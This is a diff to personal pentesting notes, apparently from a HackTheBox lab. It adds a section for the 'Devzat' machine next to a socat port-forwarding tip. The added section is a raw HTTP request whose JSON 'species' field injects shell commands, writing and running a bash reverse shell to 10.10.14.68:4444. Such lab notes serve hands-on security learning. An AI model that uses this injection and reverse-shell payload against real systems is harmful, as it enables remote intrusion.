@@ -58,3 +58,20 @@
   ## Port forwading
   ### using socat 
           socat tcp-listen:9090,fork tcp:127.0.0.1:631  ....631 is internal port  ... 9090 is the port i will in mymachine
+             
+   ### davzat
+   
+           POST /api/pet HTTP/1.1
+            Host: pets.devzat.htb
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Referer: http://pets.devzat.htb/api/pets/
+            Content-Type: text/plain;charset=UTF-8
+            Origin: http://pets.devzat.htb
+            Content-Length: 126
+            DNT: 1
+            Connection: close
+
+            {"name":"aaaaa","species":"gopher;echo 'bash -i >& /dev/tcp/10.10.14.68/4444 0>&1' > sh.sh; chmod +x sh.sh;/bin/bash ./sh.sh"}
